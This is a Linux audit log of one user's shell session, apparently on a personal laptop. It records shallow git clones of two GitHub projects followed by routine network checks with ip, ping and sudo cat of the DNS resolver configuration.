type=PATH msg=audit(1789326192.409:147): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326192.409:147): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326192.409:147): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326192.409:147): proctitle=67697400636C6F6E65002D2D646570746800310068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789326192.525:148): arch=c000003e syscall=59 success=yes exit=0 a0=5650817e8bf0 a1=5650817e8a98 a2=5650817e9120 a3=7f408b57eb28 items=3 ppid=1036 pid=1037 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326192.525:148): argc=4 a0="/usr/lib/git-core/git" a1="remote-https" a2="origin" a3="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789326192.525:148): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326192.525:148): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326192.525:148): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326192.525:148): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326192.525:148): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789326192.541:149): arch=c000003e syscall=59 success=yes exit=0 a0=5634372b8e70 a1=5634372b8d68 a2=5634372b9930 a3=7f370b7e7b28 items=3 ppid=1037 pid=1038 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326192.541:149): argc=3 a0="/usr/lib/git-core/git-remote-https" a1="origin" a2="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789326192.541:149): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326192.541:149): item=0 name="/usr/lib/git-core/git-remote-https" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326192.541:149): item=1 name="/usr/lib/git-core/git-remote-https" inode=427670 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326192.541:149): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326192.541:149): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789326215.917:150): arch=c000003e syscall=59 success=yes exit=0 a0=562893c00110 a1=562893babf10 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1040 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326215.917:150): argc=5 a0="git" a1="clone" a2="--depth" a3="1" a4="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789326215.917:150): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326215.917:150): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326215.917:150): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326215.917:150): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326215.917:150): proctitle=67697400636C6F6E65002D2D646570746800310068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789326215.921:151): arch=c000003e syscall=59 success=yes exit=0 a0=55add7614bf0 a1=55add7614a98 a2=55add7615120 a3=7f35d4c01b28 items=3 ppid=1040 pid=1041 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326215.921:151): argc=4 a0="/usr/lib/git-core/git" a1="remote-https" a2="origin" a3="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789326215.921:151): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326215.921:151): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326215.921:151): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326215.921:151): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326215.921:151): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789326215.921:152): arch=c000003e syscall=59 success=yes exit=0 a0=5622abd0fe70 a1=5622abd0fd68 a2=5622abd10930 a3=7f1c53630b28 items=3 ppid=1041 pid=1042 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326215.921:152): argc=3 a0="/usr/lib/git-core/git-remote-https" a1="origin" a2="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789326215.921:152): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326215.921:152): item=0 name="/usr/lib/git-core/git-remote-https" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326215.921:152): item=1 name="/usr/lib/git-core/git-remote-https" inode=427670 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326215.921:152): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326215.921:152): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789326289.069:153): arch=c000003e syscall=59 success=yes exit=0 a0=562893c0a7a0 a1=562893babe20 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1044 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326289.069:153): argc=5 a0="git" a1="clone" a2="--depth" a3="1" a4="https://github.com/duckdb/duckdb"
type=CWD msg=audit(1789326289.069:153): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326289.069:153): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326289.069:153): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326289.069:153): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326289.069:153): proctitle=67697400636C6F6E65002D2D646570746800310068747470733A2F2F6769746875622E636F6D2F6475636B64622F6475636B6462
type=SYSCALL msg=audit(1789326289.073:154): arch=c000003e syscall=59 success=yes exit=0 a0=55a2567edbf0 a1=55a2567eda98 a2=55a2567ee120 a3=7fc228732b28 items=3 ppid=1044 pid=1045 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326289.073:154): argc=4 a0="/usr/lib/git-core/git" a1="remote-https" a2="origin" a3="https://github.com/duckdb/duckdb"
type=CWD msg=audit(1789326289.073:154): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326289.073:154): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326289.073:154): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326289.073:154): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326289.073:154): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6475636B64622F6475636B6462
type=SYSCALL msg=audit(1789326289.077:155): arch=c000003e syscall=59 success=yes exit=0 a0=55a5c6160e70 a1=55a5c6160d68 a2=55a5c6161930 a3=7f03745d1b28 items=3 ppid=1045 pid=1046 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326289.077:155): argc=3 a0="/usr/lib/git-core/git-remote-https" a1="origin" a2="https://github.com/duckdb/duckdb"
type=CWD msg=audit(1789326289.077:155): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326289.077:155): item=0 name="/usr/lib/git-core/git-remote-https" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326289.077:155): item=1 name="/usr/lib/git-core/git-remote-https" inode=427670 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326289.077:155): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326289.077:155): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6475636B64622F6475636B6462
type=SYSCALL msg=audit(1789326301.277:156): arch=c000003e syscall=59 success=yes exit=0 a0=562893bc8e20 a1=562893bab5f0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1048 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326301.277:156): argc=5 a0="git" a1="clone" a2="--depth" a3="1" a4="https://github.com/duckdb/duckdb.git"
type=CWD msg=audit(1789326301.277:156): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326301.277:156): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326301.277:156): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326301.277:156): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326301.277:156): proctitle=67697400636C6F6E65002D2D646570746800310068747470733A2F2F6769746875622E636F6D2F6475636B64622F6475636B64622E676974
type=SYSCALL msg=audit(1789326301.281:157): arch=c000003e syscall=59 success=yes exit=0 a0=55929bdc7bf0 a1=55929bdc7a98 a2=55929bdc8120 a3=7f4d2b617b28 items=3 ppid=1048 pid=1049 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326301.281:157): argc=4 a0="/usr/lib/git-core/git" a1="remote-https" a2="origin" a3="https://github.com/duckdb/duckdb.git"
type=CWD msg=audit(1789326301.281:157): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326301.281:157): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326301.281:157): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326301.281:157): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326301.281:157): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6475636B64622F6475636B64622E676974
type=SYSCALL msg=audit(1789326301.285:158): arch=c000003e syscall=59 success=yes exit=0 a0=5628cecdae70 a1=5628cecdad68 a2=5628cecdb930 a3=7fb3f6b96b28 items=3 ppid=1049 pid=1050 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326301.285:158): argc=3 a0="/usr/lib/git-core/git-remote-https" a1="origin" a2="https://github.com/duckdb/duckdb.git"
type=CWD msg=audit(1789326301.285:158): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326301.285:158): item=0 name="/usr/lib/git-core/git-remote-https" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326301.285:158): item=1 name="/usr/lib/git-core/git-remote-https" inode=427670 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326301.285:158): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326301.285:158): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6475636B64622F6475636B64622E676974
type=SYSCALL msg=audit(1789326308.061:159): arch=c000003e syscall=59 success=yes exit=0 a0=562893c0a820 a1=562893ad2370 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1052 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326308.061:159): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789326308.061:159): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326308.061:159): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326308.061:159): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326308.061:159): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326308.061:159): proctitle=69700061
type=SYSCALL msg=audit(1789326318.597:160): arch=c000003e syscall=59 success=yes exit=0 a0=562893bab840 a1=562893bfa260 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1053 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789326318.597:160): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789326318.597:160): argc=2 a0="ping" a1="github.com"
type=CWD msg=audit(1789326318.597:160): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326318.597:160): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326318.597:160): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326318.597:160): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326318.597:160): proctitle=70696E67006769746875622E636F6D
type=SYSCALL msg=audit(1789326360.921:161): arch=c000003e syscall=59 success=yes exit=0 a0=562893bebd20 a1=562893c18bb0 a2=562893ae6e50 a3=28fcaef0ba15787c items=3 ppid=947 pid=1066 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326360.921:161): argc=3 a0="sudo" a1="cat" a2="/etc/resolv.conf"
type=CWD msg=audit(1789326360.921:161): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326360.921:161): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326360.921:161): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326360.921:161): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326360.921:161): proctitle=7375646F00636174002F6574632F7265736F6C762E636F6E66
type=USER_AUTH msg=audit(1789326365.669:162): pid=1066 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789326365.669:163): pid=1066 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789326365.669:164): pid=1066 uid=1000 auid=1000 ses=3 subj=unconfined msg='cwd="/home/Tom/Projects" cmd=636174202F6574632F7265736F6C762E636F6E66 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789326365.669:165): pid=1066 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789326365.669:166): pid=1066 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789326365.673:167): pid=1066 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789326365.673:168): pid=1066 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
